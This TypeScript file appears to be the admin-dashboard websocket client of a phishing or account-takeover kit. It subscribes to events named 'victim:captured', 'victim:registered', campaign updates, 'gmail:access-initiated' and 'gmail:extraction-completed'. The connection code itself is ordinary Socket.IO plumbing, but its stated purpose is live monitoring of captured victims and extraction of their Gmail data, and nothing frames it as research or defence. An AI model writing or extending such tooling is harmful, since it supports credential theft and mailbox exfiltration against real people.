// Socket.IO client for real-time updates
import { io, Socket } from 'socket.io-client';

const SOCKET_URL = import.meta.env.VITE_SOCKET_URL || window.location.origin;

class WebSocketClient {
  private socket: Socket | null = null;
  private reconnectAttempts = 0;
  private maxReconnectAttempts = 5;

  /**
   * Connect to Socket.IO server
   * @param {string} namespace - Socket.IO namespace (default: '/admin')
   */
  connect(namespace = '/admin'): Socket {
    if (this.socket?.connected) {
      return this.socket;
    }

    this.socket = io(`${SOCKET_URL}${namespace}`, {
      transports: ['websocket', 'polling'],
      reconnection: true,
      reconnectionAttempts: this.maxReconnectAttempts,
      reconnectionDelay: 1000,
    });

    this.socket.on('connect', () => {
      console.log('Socket.IO connected');
      this.reconnectAttempts = 0;
    });

    this.socket.on('disconnect', () => {
      console.log('Socket.IO disconnected');
    });

    this.socket.on('connect_error', (error) => {
      console.error('Socket.IO connection error:', error);
      this.reconnectAttempts++;
    });

    return this.socket;
  }

  /**
   * Disconnect from Socket.IO server
   */
  disconnect(): void {
    if (this.socket) {
      this.socket.disconnect();
      this.socket = null;
    }
  }

  /**
   * Subscribe to real-time updates
   * @param {string} type - Update type (victims, campaigns, gmail, activity)
   * @param {Function} callback - Callback function
   */
  subscribe(type: string, callback: (data: any) => void): void {
    if (!this.socket) {
      this.connect();
    }

    // Join admin room
    this.socket?.emit('subscribe:updates', { type });
    
    // Listen to generic update event
    this.socket?.on('update', (update) => {
      if (update.type === type || update.type === 'all') {
        callback(update.data);
      }
    });

    // Listen to specific events based on type
    if (type === 'victims' || type === 'all') {
      this.socket?.on('victim:captured', (data) => callback({ type: 'victim:captured', data }));
      this.socket?.on('victim:registered', (data) => callback({ type: 'victim:registered', data }));
    }
    
    if (type === 'campaigns' || type === 'all') {
      this.socket?.on('campaign:created', (data) => callback({ type: 'campaign:created', data }));
      this.socket?.on('campaign:updated', (data) => callback({ type: 'campaign:updated', data }));
      this.socket?.on('campaign:status-changed', (data) => callback({ type: 'campaign:status-changed', data }));
    }
    
    if (type === 'gmail' || type === 'all') {
      this.socket?.on('gmail:access-initiated', (data) => callback({ type: 'gmail:access-initiated', data }));
      this.socket?.on('gmail:extraction-completed', (data) => callback({ type: 'gmail:extraction-completed', data }));
    }
  }

  /**
   * Unsubscribe from updates
   */
  unsubscribe(): void {
    this.socket?.off('update');
  }

  /**
   * Get socket instance
   */
  getSocket(): Socket | null {
    return this.socket;
  }
}

// Export singleton instance
export const websocketClient = new WebSocketClient();
export default websocketClient;
